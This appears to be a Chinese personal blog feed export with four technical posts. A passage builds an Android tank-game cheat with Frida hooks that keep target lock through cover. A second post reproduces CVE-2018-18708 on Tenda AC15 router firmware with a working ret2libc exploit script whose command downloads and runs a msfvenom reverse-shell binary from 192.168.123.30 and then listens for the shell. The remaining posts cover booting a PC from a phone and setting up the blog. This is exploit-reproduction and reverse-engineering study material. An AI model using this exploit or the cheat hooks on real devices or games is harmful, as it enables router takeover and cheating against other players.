class="string">&quot;targetingSystem&quot;</span>);</span><br><span class="line">            strikerTargetingSystem = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            strikerTargetingSystem = strikerTargetingSystem3;</span><br><span class="line">        &#125;</span><br><span class="line">        TargetingSystem.DefaultImpls.target$<span class="keyword">default</span>(strikerTargetingSystem, laserParams, targetingResult, <span class="literal">false</span>, <span class="number">4</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">StrikerTargetingSystem</span> <span class="variable">strikerTargetingSystem4</span> <span class="operator">=</span> <span class="built_in">this</span>.targetingSystem;</span><br><span class="line">        <span class="keyword">if</span> (strikerTargetingSystem4 == <span class="literal">null</span>) &#123;</span><br><span class="line">            Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;targetingSystem&quot;</span>);</span><br><span class="line">            strikerTargetingSystem4 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        strikerTargetingSystem4.setPreferredTarget(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (targetingResult.hasTargetHit()) &#123;</span><br><span class="line">            <span class="type">RayHit</span> <span class="variable">singleHit</span> <span class="operator">=</span> targetingResult.getSingleHit();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">data</span> <span class="operator">=</span> singleHit.getShape().getBody().getData();</span><br><span class="line">            <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;null cannot be cast to non-null type alternativa.tanks.entity.BattleEntity&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">BattleEntity</span> <span class="variable">battleEntity</span> <span class="operator">=</span> (BattleEntity) data;</span><br><span class="line">            <span class="type">long</span> <span class="variable">id</span> <span class="operator">=</span> ((TankComponent) battleEntity.getComponent(Reflection.getOrCreateKotlinClass(TankComponent.class))).getId();</span><br><span class="line">            <span class="keyword">if</span> ((l == <span class="literal">null</span> || l.longValue() == id) &amp;&amp; isActiveTank(battleEntity) &amp;&amp; !BattleUtilsKt.isSameTeam(TankComponentKt.getTeamType(getEntity()), TankComponentKt.getTeamType(battleEntity))) &#123;</span><br><span class="line">                BattleUtilsKt.globalToLocal(singleHit.getShape().getBody(), singleHit.getPosition(), localLockPoint);</span><br><span class="line">                lockResult.update(id, singleHit.getPosition(), localLockPoint);</span><br><span class="line">                <span class="built_in">this</span>.lockingTargetUpdateMessage.init(battleEntity, targetingResult.getDirection(), lockResult);</span><br><span class="line">                getEntity().send(<span class="built_in">this</span>.lockingTargetUpdateMessage);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.stateLogic <span class="keyword">instanceof</span> RegainLockState) &#123;</span><br><span class="line">            <span class="built_in">this</span>.lockingRegainUpdateMessage.getDirection().init(targetingResult.getDirection());</span><br><span class="line">            getEntity().send(<span class="built_in">this</span>.lockingRegainUpdateMessage);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="配合-Frida-分析"><a href="#配合-Frida-分析" class="headerlink" title="配合 Frida 分析"></a>配合 Frida 分析</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">StrikerWeapon</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;alternativa.tanks.battle.weapons.types.striker.components.StrikerWeapon&quot;</span>);</span><br><span class="line"><span class="title class_">StrikerWeapon</span>[<span class="string">&quot;lockTarget&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">lockResult, l</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`StrikerWeapon.lockTarget is called: lockResult=<span class="subst">$&#123;lockResult&#125;</span>, l=<span class="subst">$&#123;l&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;lockTarget&quot;</span>](lockResult, l);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`StrikerWeapon.lockTarget result=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_frida_log.webp"
                     
                ></p>
<p>通过分析得知，该函数传入的 lockResult 是上一次扫描的目标对象，<code>l</code> 传入的是目前的瞄准对象 ID ，如果没有对象就是 <code>null</code> ，返回 <code>true</code> 则允许继续瞄准充能，返回 <code>false</code> 则不允许瞄准充能</p>
<p>所以我一开始直接 hook 让该函数永远 <code>return true</code>，但实际上这会带来很大的问题。首先如果返回永真，那么无瞄准对象时，也会进行瞄准充能。而且这个函数只会在上一次返回了 false 的情况下更新瞄准对象，如果返回永真，那么瞄准对象永远不会更新，也就是永远为 null。瞄准完成后程序会调用一个 shootGuidedRocket 函数来创建追踪火箭，如果没有瞄准对象，就没有对应的坐标值用于创建追踪火箭。</p>
<p>效果就如图中，有开火动画，但是没有火箭飞出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_no_rocket.webp"
                     
                ></p>
<p>经过一番思索后我将其设置为 <code>return result || l!=null</code></p>
<p>也就是一旦传入的ID有效就返回true，但这也会有小问题：瞄准过程中目标如果死了，仍然会继续充能，因为目标死了，ID并不会失效，目标死了但是你依旧发射了火箭，很容易被人看出来开挂，这不是我想要的</p>
<p>并且这种方式每次瞄准都需要敌人露头，实际上体验不佳</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_no_interrapt.webp"
                     
                ></p>
<p>为了解决目标死亡后继续充能的问题，我主动调用了游戏内部的 <code>isValidTarget</code> 函数进行 ID 对象解析，并且解析的是上一次的瞄准结果，只要上一次的瞄准结果的对象依旧有效，就使其 <code>return true</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于检测 Target 是否有效的函数，目标死亡、不存在都会返回 false</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidTarget</span><span class="params">(<span class="type">long</span> j)</span> &#123; </span><br><span class="line">    <span class="type">GameMode</span> <span class="variable">gameMode</span> <span class="operator">=</span> <span class="built_in">this</span>.gameMode;</span><br><span class="line">    <span class="keyword">if</span> (gameMode == <span class="literal">null</span>) &#123; </span><br><span class="line">        Intrinsics.throwUninitializedPropertyAccessException(<span class="string">&quot;gameMode&quot;</span>);</span><br><span class="line">        gameMode = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">BattleEntity</span> <span class="variable">tank</span> <span class="operator">=</span> gameMode.getTanksOnField().getTank(j);</span><br><span class="line">    <span class="keyword">if</span> (tank == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> isActiveTank(tank); &#125; </span><br></pre></td></tr></table></figure></div>

<p>Frida Script：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StrikerWeapon</span>[<span class="string">&quot;lockTarget&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">lockResult, l</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;lockTarget&quot;</span>](lockResult, l);</span><br><span class="line">    <span class="comment">// console.log(&quot;============================&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(`StrikerWeapon.lockTarget result=$&#123;result&#125;`);</span></span><br><span class="line">    <span class="comment">//console.log(`StrikerWeapon.lockTarget is called: lockResult=$&#123;lockResult&#125;, l=$&#123;l&#125;, result: $&#123;l!=null&#125;`);</span></span><br><span class="line">    <span class="comment">//console.log(&quot;lockResult.getTargetId: &quot;, lockResult.getTargetId());</span></span><br><span class="line">    <span class="comment">//console.log(&quot;vaild: &quot;, this[&quot;isValidTarget&quot;](parseInt(lockResult.getTargetId())));</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>[<span class="string">&quot;isValidTarget&quot;</span>](<span class="built_in">parseInt</span>(lockResult.<span class="title function_">getTargetId</span>())) || result;</span><br><span class="line">    <span class="comment">//return result || (l!=null);</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这样既避免了目标死亡后继续瞄准，又能实现瞄准记忆功能，在这种修改下，瞄准的结果不会丢失，使得我可以在任意位置进行瞄准，当然了打不打得到是另一回事</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_no_lose.webp"
                     
                ></p>
<p>但遗憾的是，服务器端似乎有外挂检测，检测逻辑不清楚，有可能是瞄准过程有遮挡或者没对准，然后发射出去就只有第一发有伤害，这样的话这个挂局限性就很大了，甚至可以说是反向优化。</p>
<p>但是，我突然想起来还有一个炮：</p>
<p>这个炮塔向天上发射导弹，并且只要求一开始能瞄到人，瞄准过程无视掩体，只要求对准目标</p>
<p>虽然这个炮原版的瞄准逻辑就很强了，但是还是需要敌人和我同时露头，敌人不露头我就没法瞄，我一露头就有被打的风险，所以还是有优化空间</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_scop.webp"
                     
                ></p>
<p>经过查看发现这个炮的瞄准函数都是继承的同一套 <code>lockTarget</code>，所以直接套上去就能用</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">ScorpioWeapon</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;alternativa.tanks.battle.weapons.types.scorpio.components.ScorpioWeapon&quot;</span>);</span><br><span class="line"><span class="title class_">ScorpioWeapon</span>[<span class="string">&quot;lockTarget&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">lockResult, l</span>) &#123;</span><br><span class="line">    <span class="comment">// console.log(&quot;============================&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(`ScorpioWeapon.lockTarget is called: lockResult=$&#123;lockResult&#125;, l=$&#123;l&#125;, result: $&#123;l!=null&#125;`);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> result = <span class="variable language_">this</span>[<span class="string">&quot;lockTarget&quot;</span>](lockResult, l);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lockResult.getTargetId: &quot;</span>, lockResult.<span class="title function_">getTargetId</span>());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;vaild: &quot;</span>, <span class="variable language_">this</span>[<span class="string">&quot;isValidTarget&quot;</span>](<span class="built_in">parseInt</span>(lockResult.<span class="title function_">getTargetId</span>())));</span><br><span class="line">    <span class="comment">//backtrace</span></span><br><span class="line">    <span class="comment">//console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new()));</span></span><br><span class="line">    <span class="comment">//console.log(`ScorpioWeapon.lockTarget result=$&#123;result&#125;`);</span></span><br><span class="line">    <span class="keyword">return</span> result || <span class="variable language_">this</span>[<span class="string">&quot;isValidTarget&quot;</span>](<span class="built_in">parseInt</span>(lockResult.<span class="title function_">getTargetId</span>()));</span><br><span class="line">    <span class="comment">//return result || (l!=null) ;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>然后使用效果就变成了：只要瞄过一次就能在任何地方重新瞄，无视任何掩体，只要求能对准就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tohack_scop_no_inter.webp"
                     
                ></p>
<p>由于这个炮的导弹向上飞，我只要选定一个合适的距离，导弹就可以跨过掩体打中，简直太超模了</p>
<h3 id="移植-Xposed"><a href="#移植-Xposed" class="headerlink" title="移植 Xposed"></a>移植 Xposed</h3><p>剩下的任务就是将 Frida 代码转化为 Xposed 模块，代码编写思路和 Frida 基本一致，只是换成了 Xposed API，另外要写个简单的 Activity 来控制模块的功能开关，完整代码在我Github，有兴趣可以自己查阅。</p>
<p>最后重要提示，外挂是一种破坏游戏平衡、影响玩家体验的行为，本文仅用于技术交流，请不要使用外挂在公开战场进行游戏，否则后果自负</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Xposed</tag>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>Tenda 路由器 CVE-2018-18708 漏洞复现</title>
    <url>/2024/03/14/Tenda-CVE-2018-18708/</url>
    <content><![CDATA[<p>参考：<a class="link"   href="https://www.z1r0.top/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90" >Tenda CVE-2018-18708 漏洞复现 (z1r0.top) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>固件下载：<a class="link"   href="https://github.com/z1r00/IOT_Vul/blob/main/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip" >https://github.com/z1r00/IOT_Vul&#x2F;blob&#x2F;main&#x2F;固件下载&#x2F;US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>该固件的 <code>httpd</code> 有一个栈溢出漏洞，在 post 请求处理函数 <code>fromAddressNat()</code> 中拼接 <code>page</code> 参数时使用了 <code>sprintf</code> 但没有做长度限制，导致此处变量 <code>v6</code> 可以造成栈溢出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tenda_ida.png.avif"
                     
                ></p>
<p>直接 qemu 模拟：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chroot</span> . ./qemu-arm-static /bin/httpd</span><br></pre></td></tr></table></figure></div>

<p>模拟的时候由于它带一些环境检查，所以会卡在一些地方，用 ida 简单处理下就行，最后会提示获取的 IP 地址为 <code>255.255.255.255</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tenda_ip.png.avif"
                     
                ></p>
<p>为了解决 IP 地址的问题，需要创建一个网桥</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建网桥</span></span><br><span class="line">sudo brctl addbr br0</span><br><span class="line"><span class="comment"># 向网桥中加入网卡</span></span><br><span class="line">sudo brctl addif br0 eth0 </span><br><span class="line"><span class="comment"># 开启网桥</span></span><br><span class="line">sudo ifconfig br0 up </span><br><span class="line"><span class="comment"># 可选，用于dhcp获取地址</span></span><br><span class="line">sudo dhclient br0</span><br><span class="line"><span class="comment"># 直接设置 IP</span></span><br><span class="line">sudo ifconfig br0 10.0.0.2/24</span><br></pre></td></tr></table></figure></div>

<p>然后访问 web 页面，会提示 page not found，将 <code>webroot_ro</code> 的文件复制到 <code>webroot</code> 即可</p>
<p>通过抓包可以知道，不管是 get 还是 post 必须包括 cookie：password</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">cookie = &#123;<span class="string">&quot;password&quot;</span> : <span class="string">&quot;114514&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(<span class="string">&quot;http://169.254.162.25/goform/addressNat&quot;</span>,  timeout=<span class="number">1</span>, cookies=cookie)</span><br><span class="line"><span class="keyword">except</span>:<span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>

<p>这样发包 httpd 的 log 会有反应，用 gdb 调试看看</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开启 gdb 调试端口 1234</span></span><br><span class="line">sudo <span class="built_in">chroot</span> . ./qemu-arm-static -g 1234 /bin/httpd</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ gdb-multiarch /bin/httpd</span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:1234</span><br></pre></td></tr></table></figure></div>

<p>在危险函数附近下个断点，看看能不能断下来，实际测试是能断下来，说明执行链过去了</p>
<p>然后可以传参 page 看看能不能溢出，答案是可以</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">cookie = &#123;<span class="string">&quot;password&quot;</span> : <span class="string">&quot;114514&quot;</span>&#125;</span><br><span class="line">payload = cyclic(<span class="number">256</span>+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">param = &#123; <span class="string">&quot;page&quot;</span>: payload &#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(<span class="string">&quot;http://169.254.162.25/goform/addressNat&quot;</span>,  params=param, timeout=<span class="number">1</span>, cookies=cookie)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/tenda_of.png.avif"
                     
                ></p>
<p>并且可以使用 <code>cyclic_find(&quot;laac&quot;)</code> 查找出 pc 偏移是 244，但是实际是还要 + 4，不太懂是为什么</p>
<p>既然可以控制 pc，那么可以考虑 ret2libc 执行 system，我没有真机，qemu user 模拟出来是没有随机化的，先打打看吧</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">Arch: arm</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x8000</span>)</span><br></pre></td></tr></table></figure></div>

<p>libc 的地址可以 gdb 里用 <code>vmmap</code> 看看，虽然它没显示 libc 的名字，但是 size 最大的那个地址一般就是 libc</p>
<p>于是得知 <code>libcBase = 0x3fd9c000</code></p>
<p>rop 思路：gadget1 给寄存器 reg 赋值 <code>system</code> 地址，<code>/bin/sh</code> 可以写栈上，gadget2 找那种 mov r0, sp; blx reg，这里正好有一组适合的 gadget</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先找第二个，然后决定第一个用什么寄存器</span></span><br><span class="line"><span class="comment"># ROPgadget --binary libc.so.0|grep  &quot;mov r0, sp&quot;</span></span><br><span class="line"><span class="number">0x0001fd64</span> : mov r0, sp ; sub r1, fp, <span class="comment">#0x8c ; blx r3</span></span><br><span class="line"><span class="comment"># 所以第一个用 r3，很好找到</span></span><br><span class="line"><span class="number">0x00018298</span> : pop &#123;r3, pc&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/hex/Desktop/TendaCVE/_US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/libc.so.0&quot;</span>)</span><br><span class="line">l = listen(<span class="number">9001</span>)</span><br><span class="line">libcBase = <span class="number">0x3fd9c000</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;password&quot;</span> : <span class="string">&quot;114514&quot;</span>&#125;</span><br><span class="line"><span class="comment"># payload = cyclic(256+0x100)</span></span><br><span class="line"><span class="comment"># pc_offset = cyclic_find(&quot;laac&quot;) = 244</span></span><br><span class="line"><span class="comment"># r4_offset = cyclic_find(&quot;kaac&quot;) = 240</span></span><br><span class="line">pop_r3_pc = <span class="number">0x00018298</span> + libcBase <span class="comment"># pop &#123;r3, pc&#125;</span></span><br><span class="line">mov_r0_sp = <span class="number">0x0001fd64</span> + libcBase <span class="comment"># mov r0, sp;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&quot;/usr/bin/wget http://192.168.123.30:8888/venom -O /var/venom; /bin/chmod 777 /var/venom; /var/venom&quot;</span></span><br><span class="line"><span class="comment"># cmd 写入的位置正好是 sp</span></span><br><span class="line"><span class="comment"># 用 msfvenom 生成了反弹 shell 木马，反弹连本机</span></span><br><span class="line"><span class="comment"># msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.123.30 LPORT=9001 -f elf -o venom</span></span><br><span class="line"><span class="comment"># 随便用 busybox 开个 web 服务把马子放进去就行</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">244</span> + <span class="string">b&quot;a&quot;</span>*<span class="number">4</span> + p32(pop_r3_pc) + p32(libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>]) + p32(mov_r0_sp) + cmd</span><br><span class="line">param = &#123; <span class="string">&quot;page&quot;</span>: payload &#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.post(<span class="string">&quot;http://169.254.162.25/goform/addressNat&quot;</span>,  params=param, timeout=<span class="number">1</span>, cookies=cookie)</span><br><span class="line"><span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">l.wait_for_connection()</span><br><span class="line">success(<span class="string">&quot;reversed shell&quot;</span>)</span><br><span class="line">l.interactive()</span><br></pre></td></tr></table></figure></div>

<p>随后我尝试用 qemu system 模拟，但是 gdbserver 传上去，本地 gdb 连上会报错，查了下是个存在很久的 bug，后面没搞了</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>路由器， Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Android手机(rooted)模拟USB或CD-ROM设备来引导电脑启动</title>
    <url>/2022/12/24/drivedroid/</url>
    <content><![CDATA[<p>最近老爸和我说他那边电脑老是启动时显英文字母，我一看就知道是硬盘快不行了，果断下单买了块机械。</p>
<p>今天硬盘倒是到了，我却发现我U盘忘在学校了，家里居然一个U盘都没有，这咋装系统呢？</p>
<p>我忽然想到以前在酷安上看见过一个大佬的帖子，用Android手机能模拟U盘来引导启动。</p>
<p>搜索了下，软件名字叫<a class="link"   href="https://www.drivedroid.io/" >Drivedroid <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，看上去很久没更新了。我以前用一台小米2测试成功过，但那台机子尾插有问题，传数据很容易中断。我翻出了我的小米5，准备尝试一波。官网的changelog写着软件最新版Target API是Android 9，我米5是10，应该问题不大，先下载安装看看。</p>
<p>进入软件，会请求root权限，让你设置存放镜像的目录，这些步骤都没什么说的，重点在于后面。先将手机连上电脑，然后选择USB模式为文件传输。回到软件，进入这个页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/drivedroid_setup.jpg.avif"
                      alt="Setup"
                ></p>
<p>这个页面是选择手机USB模拟的模式，这决定了这台手机是否能用于模拟USB&#x2F;CD-ROM设备。大多数手机选第一个就行了，我的米5选第一个会一直Hosting image。这里我选第二个，先往后看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/drivedroid_setup2.jpg.avif"
                      alt="Setup"
                ></p>
<p>这个页面是问你电脑上有没有显示手机设备。打开资源管理器，选择此电脑，就能看到是否有Android设备。</p>
<p>如果有，大概是这样的：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/thispc.jpg.avif"
                      alt="thispc"
                ></p>
<p>如果没有，我也不知道为什么，反正我的电脑上也没有，就选择No devices了</p>
<p>然后下一步，是要尝试用手机来引导电脑启动：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/drivedroid_setup3.jpg.avif"
                      alt="boot"
                ></p>
<p>就是重启电脑，然后选择BIOS启动项，这里不再赘述，不懂的可以搜下。反正是选比较可疑的那项，一般是带”Linux”字样的，选择后BIOS就会开始引导</p>
<p>如果你的手机引导成功了，那么屏幕上应该会出现Drivedroid的提示说成功了；如果是进了原系统了，或者就亮一行黑字提示重启、找不到设备之类的，那么说明引导失败了，可以在手机屏幕上选择相应的选项，按软件的提示来继续。或者我们可以直接回到之前选择USB SYSTEM那里，继续尝试其他选项。如果还是没法启动，那你的手机可能不支持作为USB&#x2F;CD-ROM设备用于引导，又或者是你的数据线有问题，可以自己多尝试下。</p>
<p>至于我，我一开始压根没试，直接选的启动成功，进到了软件的主页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/drivedroid_main.jpg.avif"
                      alt="main"
                ></p>
<p>这里就可以选自己镜像了，建议选择模式为CD-ROM或Writable USB，镜像存放的目录就是一开始让你选的那个目录。图中我已经存了个win8.1的镜像，写这文的时候PE的镜像还在用毒盘以20KB&#x2F;s的速率下载着。</p>
<p>最后提一嘴，我认为win8.1比win7更好用。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>博客搭建</title>
    <url>/2022/12/15/first_blog/</url>
    <content><![CDATA[<p>更新于2022-12-16 22:17</p>
<p>以前搭建过博客和Onedrive资源站。资源站是一键式搭建的，但博客是用一个静态网页完全自己手动编辑的，当时不懂博客框架这种东西。这次搭博客我选择用Github+Hexo搭建。域名暂时懒得买了，就用Github Page凑合下。</p>
<p>都是照着教程来的，过程没什么写的，这里简单写一下遇到的坑。</p>
<h3 id="WSL与Windows共用PATH"><a href="#WSL与Windows共用PATH" class="headerlink" title="WSL与Windows共用PATH"></a>WSL与Windows共用PATH</h3><p>安装Nodejs时发现的，因为我Windows和WSL里都装了Nodejs，而WSL的$PATH中居然包含Windows的PATH，导致我在WSL中无法正常运行npm。不是很理解这种机制到底有什么意义。</p>
<p>解决方案：编辑&#x2F;etc&#x2F;wsl.conf，添加如下字段</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[interop]</span><br><span class="line">appendWindowsPath=false</span><br></pre></td></tr></table></figure></div>

<p>然后管理员运行PowerShell，执行如下命令以重启WSL</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">net stop LxssManager; net start LxssManager</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Live2D"><a href="#Live2D" class="headerlink" title="Live2D"></a>Live2D</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/xtxnbj.jpg.avif"
                     
                ></p>
<p>在电脑端访问我的博客，会加载一个Live2D小人。这玩意儿我很早以前在第一个博客里放过，但是当时完全是静态Html，直接引用一条js即可。现在我使用Hexo，页面是根据主题自动生成的，如何插入js？</p>
<p>主题生成页面时肯定有某些规则文件。研究了一番，发现是在主题根目录的layout文件夹中(仅对于我的主题”redefine”而言)，里面有很多ejs文件，记录了生成页面的规则。找到head.ejs文件添加&lt;script&gt;代码即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://gcore.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/live2djs.jpg.avif"
                     
                ></p>
<p>我当年弄网页Live2D就是想要放上血小板那个模型，但当年怎么都找不到，而且技术也不过关。现在看来，这个Live2D接口要自己搭后端，否则就只能用别人的老接口，用现有的模型。最近期末了比较忙没时间整了，先挖个坑以后来填。</p>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><p>代码块的默认字体太丑了，换成Consolas了，也是靠修改主题文件中的highlight.styl配置，把font-family参数全部修改。</p>
<p>Mozilla还有个页面可以在线调试字体配置：<a class="link"   href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-family" >https://developer.mozilla.org/zh-CN/docs/Web/CSS/font-family <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
